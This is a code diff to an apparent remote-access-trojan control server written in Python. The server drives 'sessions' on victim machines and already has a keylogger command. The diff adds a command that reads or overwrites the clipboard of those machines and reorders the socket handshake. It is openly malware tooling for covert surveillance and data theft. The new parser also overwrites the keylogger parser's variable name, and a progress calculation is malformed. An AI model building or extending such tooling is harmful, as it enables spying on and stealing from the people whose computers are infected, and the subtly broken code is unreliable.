@@ -169,6 +169,20 @@ class Server:
                 elif response["data"]:
                     self.user_interface.poutput(response["data"])
 
+    def edit_clipboard(self, content, connections):
+        request = {"cmd": "b",
+                   "content": content,
+                   "timeout": self.user_interface.cmd_timeout}
+        for connection in connections:
+            self.connection.send(request, connection)
+            valid, response = self.connection.recv(connection, {"error": str, "data": str})
+            if valid:
+                if response["error"]:
+                    self.user_interface.perror(
+                        f"Error from session {self.connection.get_index_by_connection(connection)}: {response['error']}")
+                elif response["data"]:
+                    self.user_interface.poutput(response["data"])
+
     def block_address(self, action, addresses, close_existing):
         if action == "add":
             for address in addresses:
@@ -255,9 +269,9 @@ class Connection:
         data = self.encrypt(json.dumps(data).encode(self.CODEC))
         len_data_total = len(data)
         total_packets = math.ceil(len_data_total / self.PACKET_SIZE)
-        connection.sendall(str(len_data_total).encode("utf8"))
-        connection.recv(self.PACKET_SIZE)
         try:
+            connection.sendall(str(len_data_total).encode("utf8"))
+            connection.recv(self.PACKET_SIZE)
             for packet_number in range(total_packets):
                 connection.sendall(data[packet_number*self.PACKET_SIZE:(packet_number + 1) * self.PACKET_SIZE])
                 sys.stdout.write(f"\r[*] sending {self.format_byte_length(len_data_total)} to {packet_number + 1 / (total_packets / 100)}% complete")
@@ -369,6 +383,10 @@ class UserInterface(cmd2.Cmd):
     log_keys_parser.add_argument("-f", "--file", default="log.txt", type=str, help="file to store logs in")
     log_keys_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")
 
+    log_keys_parser = argparse.ArgumentParser(prog="clip")
+    log_keys_parser.add_argument("-c", "--content", default="", type=str, help="content to store to clipboard if provided")
+    log_keys_parser.add_argument("-s", "--sessions", required=True, nargs="+", help="sessions indices or groups")
+
     block_parser = argparse.ArgumentParser(prog="block")
     block_parser.add_argument("-a", "--action", required=True, type=str, choices=["add", "rm", "list"])
     block_parser.add_argument("-i", "--ips", nargs="+", type=str, help="addresses to block")
@@ -472,6 +490,11 @@ class UserInterface(cmd2.Cmd):
     def do_logger(self, args):
         """Start/Stop keylogger"""
         self.server.log_keys(args.action, args.file, self.server.connection.get_conn_fgoi(args.sessions))
+
+    @cmd2.decorators.with_argparser(log_keys_parser)
+    def do_clip(self, args):
+        """Get/Set clipboard content"""
+        self.server.edit_clipboard(args.content, self.server.connection.get_conn_fgoi(args.sessions))
 
     @cmd2.decorators.with_argparser(block_parser)
     def do_block(self, args):
